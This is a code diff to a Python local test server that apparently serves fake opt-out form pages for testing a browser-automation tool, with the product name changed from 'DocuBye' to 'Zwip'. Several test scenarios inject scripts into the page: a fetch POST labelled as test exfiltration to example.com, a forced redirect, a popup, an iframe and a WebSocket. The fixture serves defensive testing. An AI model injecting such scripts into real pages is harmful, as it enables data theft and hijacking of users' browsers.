@@ -87,7 +87,7 @@ class _Handler(BaseHTTPRequestHandler):
         path = urlparse(self.path).path
         scenario = self.server.state.scenario
         if path == "/":
-            self._send(200, '<!doctype html><h1>DocuBye local test fixture</h1><a href="/opt-out">Open demo form</a>')
+            self._send(200, '<!doctype html><h1>Zwip local test fixture</h1><a href="/opt-out">Open demo form</a>')
         elif path == "/opt-out":
             if scenario == "challenge":
                 body = '<!doctype html><h1>Verification required</h1><p data-testid="human-check">Complete identity verification to continue.</p>'
@@ -103,27 +103,27 @@ class _Handler(BaseHTTPRequestHandler):
             elif scenario == "external-request":
                 body = OPT_OUT_HTML.replace(
                     "</body>",
-                    '<script>fetch("https://example.com/docubye-test-exfiltration", {method:"POST", body:"synthetic-only"}).catch(() => {});</script></body>',
+                    '<script>fetch("https://example.com/zwip-test-exfiltration", {method:"POST", body:"synthetic-only"}).catch(() => {});</script></body>',
                 )
             elif scenario == "external-redirect":
                 body = OPT_OUT_HTML.replace(
                     "</body>",
-                    '<script>window.location.assign("https://example.com/docubye-redirect");</script></body>',
+                    '<script>window.location.assign("https://example.com/zwip-redirect");</script></body>',
                 )
             elif scenario == "external-popup":
                 body = OPT_OUT_HTML.replace(
                     "</body>",
-                    '<script>window.open("https://example.com/docubye-popup", "_blank");</script></body>',
+                    '<script>window.open("https://example.com/zwip-popup", "_blank");</script></body>',
                 )
             elif scenario == "external-frame":
                 body = OPT_OUT_HTML.replace(
                     "</body>",
-                    '<iframe src="https://example.com/docubye-frame" title="unexpected frame"></iframe></body>',
+                    '<iframe src="https://example.com/zwip-frame" title="unexpected frame"></iframe></body>',
                 )
             elif scenario == "external-websocket":
                 body = OPT_OUT_HTML.replace(
                     "</body>",
-                    '<script>new WebSocket("wss://example.com/docubye-test-socket");</script></body>',
+                    '<script>new WebSocket("wss://example.com/zwip-test-socket");</script></body>',
                 )
             elif scenario == "bad-form-action":
                 body = OPT_OUT_HTML.replace('action="/submit"', 'action="/unexpected-submit"')
